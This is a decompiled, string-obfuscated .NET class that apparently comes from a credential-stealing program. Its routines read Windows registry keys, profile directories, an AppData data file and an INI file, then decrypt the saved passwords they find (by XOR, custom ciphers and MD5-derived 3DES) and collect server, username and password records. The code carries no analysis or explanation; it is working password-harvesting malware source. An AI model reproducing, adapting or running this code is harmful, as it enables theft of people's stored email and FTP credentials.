	internal static List<JK> PK()
	{
		//Discarded unreachable code: IL_0385, IL_0398
		//IL_038f: Expected O, but got I4
		//IL_0390: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			RegistryKey[] array = new RegistryKey[4]
			{
				Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oIzyHmCNWD1HtshgKl0PCMqXD8WpIhJ5ZLKWS83Cc0Tb0aVQ6hdB6HRIw0xtfXuEpmpiKu9I3vkswQtBMlP25slUBVZZOA6sB3MX3S3bIRIfp")),
				Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI6h1rNqdq+rlANdh6Ef29KelgAp0y6gsCspLDS+k+xmN3u4pa7QjJKNNxjqdFef8uSyZ4+oRIezGAZ7O2Ymdm567YkaSNPsDCFGn1q/mpEQ8qWizXoGHbCWYWPXcMT5TKX13pc7xyzElMZxXgyNPejE=")),
				Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI2KLp9a9RS/heKGWEr14KyfZjsKBOeRa3UZkwnFAPL680mFGvpGBnSZA6EL6n+CeGF3WOZzOFjgJqxs1HIZUa59YjbHagP7pVAf21RNqUmCg")),
				Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI00Ib2KFbydd3BzPWrqCeK+5E/SBh1+oMruJOR5xAoT79z3fme1FdmuEdopibD6RXcbk+EsgVni/KgI3MqM5DMg0EehAyCvEIdzAmHgRDpHa"))
			};
			RegistryKey[] array2 = array;
			foreach (RegistryKey registryKey in array2)
			{
				if (registryKey == null)
				{
					continue;
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						UTF8Encoding uTF8Encoding = new UTF8Encoding();
						try
						{
							if (!((registryKey2.GetValue(O.I("lkjdapZ+PI0ywMDU6XQx6g==")) != null) & ((registryKey2.GetValue(O.I("fJCRta1D5SAGtfL4Qpb/iA==")) != null) | (registryKey2.GetValue(O.I("Wrvxou/fnUM/mvwYID3kZA==")) != null) | (registryKey2.GetValue(O.I("+PYtslsMCgu0pmWy+ocN9w==")) != null) | (registryKey2.GetValue(O.I("0LTn3V9i2Sk0psMXEsjEOg==")) != null))))
							{
								continue;
							}
							string[] array3 = new string[4]
							{
								O.I("fJCRta1D5SAGtfL4Qpb/iA=="),
								O.I("Wrvxou/fnUM/mvwYID3kZA=="),
								O.I("+PYtslsMCgu0pmWy+ocN9w=="),
								O.I("0LTn3V9i2Sk0psMXEsjEOg==")
							};
							string text = "";
							string[] array4 = array3;
							foreach (string name2 in array4)
							{
								if (registryKey2.GetValue(name2) != null)
								{
									byte[] qGX_ = (byte[])registryKey2.GetValue(name2);
									text = KNH(qGX_);
								}
							}
							object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(O.I("lkjdapZ+PI0ywMDU6XQx6g==")));
							byte[] bytes;
							try
							{
								string memberName = O.I("Va8YUWSGdVTpQRL5ZkP+IQ==");
								object[] array5 = new object[1]
								{
									RuntimeHelpers.GetObjectValue(objectValue)
								};
								bool[] array6 = new bool[1]
								{
									true
								};
								object obj = NewLateBinding.LateGet(uTF8Encoding, null, memberName, array5, null, null, array6);
								if (array6[0])
								{
									objectValue = RuntimeHelpers.GetObjectValue(array5[0]);
								}
								bytes = (byte[])obj;
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								bytes = (byte[])objectValue;
								ProjectData.ClearProjectError();
							}
							JK jK = new JK();
							if (registryKey2.GetValue(O.I("UJZjjblti8kE87lyyE3SpA==")) != null)
							{
								try
								{
									jK.WE_114 = Conversions.ToString(registryKey2.GetValue(O.I("UJZjjblti8kE87lyyE3SpA==")));
								}
								catch (Exception ex)
								{
									ProjectData.SetProjectError(ex);
									Exception ex2 = ex;
									jK.WE_114 = uTF8Encoding.GetString((byte[])registryKey2.GetValue(O.I("UJZjjblti8kE87lyyE3SpA=="))).Replace(O.I("1q+SWZtRAiG6kFDATSWqOw=="), "");
									ProjectData.ClearProjectError();
								}
							}
							else
							{
								jK.WE_114 = O.I("AHFmvOau6QNfj4hNHdkf6w==");
							}
							jK.ECS_112 = uTF8Encoding.GetString(bytes).ToString().Replace(Conversions.ToString(Convert.ToChar(0)), "");
							jK.GA_113 = text.Replace(Conversions.ToString(Convert.ToChar(0)), "");
							jK.NP_115 = O.I("fySKIOKZx14PCN3OJywthQ==");
							list.Add(jK);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			return list;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> GV_()
	{
		//Discarded unreachable code: IL_07f9, IL_080c
		//IL_0803: Expected O, but got I4
		//IL_0804: Expected O, but got I4
		List<JK> list = new List<JK>();
		checked
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(W.F_4.Registry.GetValue(O.I("kwTbWGPthx54z7ItP6ZZgGcKxLt+YRwXjnX+hSyarXmkapcIwu0+1kmJIwI+O671SYyr0ENEf24o8c4OaC79mQ=="), O.I("S1PYW1AB+xHHKeodD/q4nQ=="), null));
				string directoryName = Path.GetDirectoryName(Conversions.ToString(objectValue));
				object objectValue2 = RuntimeHelpers.GetObjectValue(W.F_4.Registry.GetValue(O.I("kwTbWGPthx54z7ItP6ZZgGcKxLt+YRwXjnX+hSyarXkbouVlZ+qBccEqBCXtEC2M"), O.I("Vi6sCceUpu8ZouCIXvTaZw=="), null));
				string directoryName2 = Path.GetDirectoryName(Conversions.ToString(objectValue2));
				string[] array = new string[0];
				string[] array2 = new string[0];
				if (Directory.Exists(directoryName + O.I("ipbAJFUul7rwUrF1HCN6cg==")))
				{
					array = Directory.GetDirectories(directoryName + O.I("ipbAJFUul7rwUrF1HCN6cg=="));
				}
				if (Directory.Exists(directoryName2 + O.I("/MbuisqJzSrVy8+JMI1fLg==")))
				{
					array2 = Directory.GetDirectories(directoryName2 + O.I("/MbuisqJzSrVy8+JMI1fLg=="));
				}
				else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + O.I("7WhqsxFkmNztJfjbfu1/b98cBjyPzObeNS9/cGt2nJPCf65W31ZXQRHAsrFRUKmR")))
				{
					array2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + O.I("7WhqsxFkmNztJfjbfu1/b98cBjyPzObeNS9/cGt2nJPCf65W31ZXQRHAsrFRUKmR"));
				}
				else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + O.I("7WhqsxFkmNztJfjbfu1/bwC0RhdeXnofyEUtLvOjOIytifM059GXAItq84keysP9")))
				{
					array2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + O.I("7WhqsxFkmNztJfjbfu1/bwC0RhdeXnofyEUtLvOjOIytifM059GXAItq84keysP9"));
				}
				if (array.Length + array2.Length < 1)
				{
					return new List<JK>();
				}
				string[] array3 = new string[array.Length + array2.Length - 1 + 1];
				if (array.Length > 0)
				{
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array3[i] = array[i] + O.I("L1588vhPHK6mbHFsgsOFsRVoTmhutkFpdi5q6LRnMu0=");
					}
				}
				if (array2.Length > 0)
				{
					int num2 = 0;
					int num3 = array.Length;
					int num4 = array3.Length - 1;
					for (int j = num3; j <= num4; j++)
					{
						array3[j] = array2[num2] + O.I("wgvvNgBcHl5EOUFPEcAW9A==");
						num2++;
					}
				}
				string[] array4 = array3;
				foreach (string path in array4)
				{
					object instance = new FileStream(path, FileMode.Open);
					object obj = Conversions.ToInteger(NewLateBinding.LateGet(instance, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null));
					object obj2 = new byte[Conversions.ToInteger(Operators.SubtractObject(obj, 1)) + 1];
					bool flag = false;
					bool flag2 = false;
					string text = "";
					int num5 = 0;
					JK jK = new JK();
					string memberName = O.I("KoT6VeZVDK5Yr4S8X85hJg==");
					object[] array5 = new object[3]
					{
						RuntimeHelpers.GetObjectValue(obj2),
						0,
						RuntimeHelpers.GetObjectValue(obj)
					};
					object[] arguments = array5;
					bool[] array6 = new bool[3]
					{
						true,
						false,
						true
					};
					NewLateBinding.LateCall(instance, null, memberName, arguments, null, null, array6, true);
					if (array6[0])
					{
						obj2 = RuntimeHelpers.GetObjectValue(array5[0]);
					}
					if (array6[2])
					{
						obj = RuntimeHelpers.GetObjectValue(array5[2]);
					}
					num5 = ((!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj2, new object[1]
					{
						0
					}, null), 208, false)) ? 1 : 0);
					int num6 = Conversions.ToInteger(Operators.SubtractObject(obj, 1));
					for (int l = 0; l <= num6; l++)
					{
						if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj2, new object[1]
						{
							l
						}, null), 32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj2, new object[1]
						{
							l
						}, null), 127, false) && Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateIndexGet(obj2, new object[1]
						{
							l
						}, null), 61, false))
						{
							text += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj2, new object[1]
							{
								l
							}, null))));
							if (text.Equals(O.I("WZe4T+IjImnCpLpldh4+pw==")) || text.Equals(O.I("ZQdmL63nzDGf6DmMtwhE3Q==")) || text.Equals(O.I("1YIfduGBTh1bYpQ46Lkytg==")))
							{
								int num7 = l + 9;
								if (num5 == 0)
								{
									num7 = l + 2;
								}
								while (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num7
								}, null), 32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num7
								}, null), 127, false))
								{
									jK.WE_114 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj2, new object[1]
									{
										num7
									}, null))));
									num7++;
								}
								flag2 = true;
								l = num7;
							}
							else if (text.Equals(O.I("4FUfAFiI8UED7oRNFpn/1A==")) || text.Equals(O.I("xUkBAW91aBzANd/qKCeR1w==")))
							{
								int num8 = l + 9;
								if (num5 == 0)
								{
									num8 = l + 2;
								}
								while (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num8
								}, null), 32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num8
								}, null), 127, false))
								{
									jK.ECS_112 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj2, new object[1]
									{
										num8
									}, null))));
									num8++;
								}
								flag = true;
								l = num8;
							}
							else
							{
								if (!flag || !flag2 || (!text.Equals(O.I("zC6rDcYSQtGl61RYawCHyg==")) && !text.Equals(O.I("6NI/TLD2BtcJRSXEb69f8g=="))))
								{
									continue;
								}
								int num9 = l + 9;
								if (num5 == 0)
								{
									num9 = l + 2;
								}
								string text2 = "";
								while (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num9
								}, null), 32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj2, new object[1]
								{
									num9
								}, null), 127, false))
								{
									text2 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj2, new object[1]
									{
										num9
									}, null))));
									num9++;
								}
								if (Operators.CompareString(text2, "", false) != 0)
								{
									jK.GA_113 = ND(num5, text2);
								}
								else
								{
									jK.GA_113 = O.I("D7+b5hvgGQurALxih/YqaQ==");
								}
								bool flag3 = false;
								foreach (JK item in list)
								{
									if (item.ECS_112.Equals(jK.ECS_112) && item.GA_113.Equals(jK.GA_113))
									{
										flag3 = true;
										break;
									}
								}
								if (!flag3)
								{
									jK.NP_115 = O.I("zIQjkPvBzsUIHo26sCCJMg==");
									list.Add(jK);
									flag3 = false;
								}
								jK = null;
								jK = new JK();
								flag2 = false;
								flag = false;
								l = num9;
							}
						}
						else
						{
							text = "";
						}
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static string ND(int NSI__246, string VDV_247)
	{
		//Discarded unreachable code: IL_022c, IL_023f
		//IL_0236: Expected O, but got I4
		//IL_0237: Expected O, but got I4
		string text = "";
		checked
		{
			try
			{
				int[] array = new int[8]
				{
					126,
					100,
					114,
					97,
					71,
					111,
					110,
					126
				};
				int[] array2 = new int[8]
				{
					126,
					70,
					64,
					55,
					37,
					109,
					36,
					126
				};
				int num = Convert.ToInt32(O.I("bKxjNHyTK+TpI+9mHyytSQ=="), 16);
				if (NSI__246 == 1)
				{
					array = null;
					array = array2;
					array2 = null;
					num = Convert.ToInt32(O.I("ei1h8SFOX6OuGPRdw4+APQ=="), 16);
				}
				int num2 = (int)Math.Round((double)VDV_247.Length / 2.0);
				int num3 = 0;
				int[] array3 = new int[num2 - 1 + 1];
				int num4 = num2 - 1;
				for (int i = 0; i <= num4; i++)
				{
					array3[i] = Convert.ToInt32(VDV_247.Substring(num3, 2), 16);
					num3 += 2;
				}
				int[] array4 = new int[array3.Length - 1 + 1];
				array4[0] = array3[0] ^ num;
				Array.Copy(array3, 1, array4, 1, array3.Length - 1);
				while (array3.Length > array.Length)
				{
					int[] array5 = new int[array.Length * 2 - 1 + 1];
					Array.Copy(array, 0, array5, 0, array.Length);
					Array.Copy(array, 0, array5, array.Length, array.Length);
					array = null;
					array = array5;
					array5 = null;
				}
				int[] array6 = new int[array3.Length - 1 + 1];
				int num5 = array3.Length - 1;
				for (int j = 1; j <= num5; j++)
				{
					array6[j - 1] = array3[j] ^ array[j - 1];
				}
				int[] array7 = new int[array6.Length - 1 + 1];
				int num6 = array6.Length - 2;
				for (int k = 0; k <= num6; k++)
				{
					if (array6[k] - array4[k] < 0)
					{
						array7[k] = array6[k] + 255 - array4[k];
					}
					else
					{
						array7[k] = array6[k] - array4[k];
					}
					text += Conversions.ToString(Strings.ChrW(array7[k]));
				}
				return text;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return text;
			}
		}
	}

	internal static string AR(string FY_248, string SFF_249, string LJ_250, int HA_251)
	{
		//Discarded unreachable code: IL_0031, IL_0044
		//IL_003b: Expected O, but got I4
		//IL_003c: Expected O, but got I4
		try
		{
			string input = Regex.Split(FY_248, SFF_249)[checked(HA_251 + 1)];
			return Regex.Split(input, LJ_250)[0];
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = O.I("EKkSaEXIgeQgfs+dkQ5Sdw==");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static bool OAJ(string ISX_252, string MH__253)
	{
		//Discarded unreachable code: IL_0008, IL_001b
		//IL_0012: Expected O, but got I4
		return ISX_252.Contains(MH__253);
	}

	internal static List<JK> RY()
	{
		//Discarded unreachable code: IL_01d6, IL_01e9
		//IL_01e0: Expected O, but got I4
		//IL_01e1: Expected O, but got I4
		string text = "";
		List<JK> list = new List<JK>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text2 = "";
		string text3 = "";
		checked
		{
			if (File.Exists(folderPath + O.I("8GmaAgylkPoVR8BAN/egjHjLr2Cr/0Lw1P1DexWpnVM=")))
			{
				folderPath += O.I("8GmaAgylkPoVR8BAN/egjHjLr2Cr/0Lw1P1DexWpnVM=");
				string text4 = "";
				try
				{
					byte[] array = File.ReadAllBytes(folderPath);
					int num = 0;
					int num2 = array.Length - 5;
					for (int i = 0; i <= num2; i++)
					{
						if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
						{
							num = array[i + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num - 1 + 1];
							Array.Copy(array, i + 4, array2, 0, array2.Length);
							Array.Copy(array, i + 16, array3, 0, array3.Length);
							text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(AX(array2, array3), O.I("DPidYWtSqCMwGKLiwQEQPw=="))));
							i += 11 + num;
						}
					}
					text = RR(text);
					string[] array4 = Strings.Split(text, O.I("DPidYWtSqCMwGKLiwQEQPw=="));
					int num3 = array4.Length - 3;
					for (int j = 4; j <= num3; j += 3)
					{
						JK jK = new JK();
						text2 = array4[j + 1];
						text3 = array4[j + 2];
						jK.WE_114 = array4[j].Replace(O.I("M/3M8Kr51PzLQWiF0FfImw=="), "");
						jK.ECS_112 = text2;
						jK.GA_113 = text3;
						jK.NP_115 = O.I("VJw9fcHR/9ZZX9Jx0tbBeQ==");
						list.Add(jK);
					}
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					List<JK> result = new List<JK>();
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return new List<JK>();
		}
	}

	internal static string RR(string VU_254)
	{
		//Discarded unreachable code: IL_0055, IL_0068
		//IL_005f: Expected O, but got I4
		//IL_0060: Expected O, but got I4
		string text = O.I("oQeM5tEk3fcv9pqfyHzugNQ0fbcFZSFHvSI0JrS4swCc2s6bMNSQdNU9NX+fsDR+4zbVL+wcqfTGwsr9mqXT6HNXiE66XPHsQ1/CYexsQPs=");
		string text2 = "";
		int i = 0;
		for (int length = VU_254.Length; i < length; i = checked(i + 1))
		{
			string text3 = Conversions.ToString(VU_254[i]);
			if (text.Contains(text3.ToLower()))
			{
				text2 += text3;
			}
		}
		return text2;
	}

	internal static object AX(byte[] HBW_255, byte[] _A_256)
	{
		//Discarded unreachable code: IL_014e, IL_0161
		//IL_0158: Expected O, but got I4
		//IL_0159: Expected O, but got I4
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				mD5CryptoServiceProvider.Initialize();
				byte[] array = new byte[SP_119.Length + (HBW_255.Length - 1) + 1];
				Array.Copy(SP_119, array, SP_119.Length);
				Array.Copy(HBW_255, 0, array, SP_119.Length, HBW_255.Length);
				byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + SP_119.Length + (HBW_255.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(SP_119, 0, array, array2.Length, SP_119.Length);
				Array.Copy(HBW_255, 0, array, array2.Length + SP_119.Length, HBW_255.Length);
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				tripleDESCryptoServiceProvider.Key = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(_A_256, 0, _A_256.Length);
				return Encoding.Unicode.GetString(bytes);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static string JHC(string KP_257)
	{
		//Discarded unreachable code: IL_0061, IL_0074
		//IL_006b: Expected O, but got I4
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(KP_257);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static object KHR(string BR_258)
	{
		//Discarded unreachable code: IL_0011, IL_0024
		//IL_001b: Expected O, but got I4
		return Encoding.UTF8.GetString(Convert.FromBase64String(BR_258));
	}

	internal static List<JK> PVO()
	{
		//Discarded unreachable code: IL_01f6, IL_0209
		//IL_0200: Expected O, but got I4
		//IL_0201: Expected O, but got I4
		List<JK> list = new List<JK>();
		string text = "";
		string text2 = "";
		ZP zP = new ZP();
		if (File.Exists(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("YtutvWdsaYMXNIFKLCz0N0imxXilR8Keogf635BrGf4=")))
		{
			zP.Load(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("YtutvWdsaYMXNIFKLCz0N0imxXilR8Keogf635BrGf4="));
			{
				foreach (string key in zP.Keys)
				{
					JK jK = new JK();
					foreach (string key2 in zP[key].Keys)
					{
						if (Operators.CompareString(key2, O.I("lkjdapZ+PI0ywMDU6XQx6g=="), false) == 0)
						{
							jK.ECS_112 = zP[key][key2];
						}
						else if (Operators.CompareString(key2, O.I("8pFW7qbOfNmGjXJ+7laaxA=="), false) == 0)
						{
							if (zP[key][key2] != null)
							{
								jK.GA_113 = SBP(zP[key][key2], 0);
							}
						}
						else if (Operators.CompareString(key2, O.I("fp02Yx4bklROuFv1THwLZw=="), false) == 0)
						{
							if (Operators.CompareString(zP[key][key2], "", false) != 0)
							{
								jK.GA_113 = SBP(zP[key][key2], 0);
							}
						}
						else if (Operators.CompareString(key2, O.I("pXq/St24TQhC51h/nUvlhQ=="), false) == 0)
						{
							jK.WE_114 = zP[key][key2];
						}
					}
					jK.NP_115 = O.I("X3MET+XQzjHk9+rMuOl4qA==");
					list.Add(jK);
				}
				return list;
			}
		}
		return new List<JK>();
	}

	internal static string HexToString(string hex)
	{
		//Discarded unreachable code: IL_0045, IL_0058
		//IL_004f: Expected O, but got I4
		//IL_0050: Expected O, but got I4
		StringBuilder stringBuilder = new StringBuilder(hex.Length / 2);
		checked
		{
			int num = hex.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				stringBuilder.Append(Strings.Chr(Convert.ToByte(hex.Substring(i, 2), 16)));
			}
			return stringBuilder.ToString();
		}
	}

	internal static string SBP(string _SY_259, int PEL_260)
	{
		//Discarded unreachable code: IL_00a2, IL_00b5
		//IL_00ac: Expected O, but got I4
		//IL_00ad: Expected O, but got I4
		byte[] bytes = Encoding.Default.GetBytes(HexToString(_SY_259));
		checked
		{
			byte[] array = new byte[bytes.Length - 1 + 1];
			int num = ((PEL_260 == 0) ? 10906 : 9527);
			try
			{
				int num2 = bytes.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					array[i] = BitConverter.GetBytes(bytes[i] ^ (num >> 8))[0];
					num = (unchecked((int)bytes[i]) + num) * 33089 + 12657;
					num = BitConverter.ToInt16(BitConverter.GetBytes(num), 0);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = O.I("qjGFefkgpI/0N1bUQ62lxw==");
				ProjectData.ClearProjectError();
				return result;
			}
			return Encoding.Default.GetString(array);
		}
	}
}
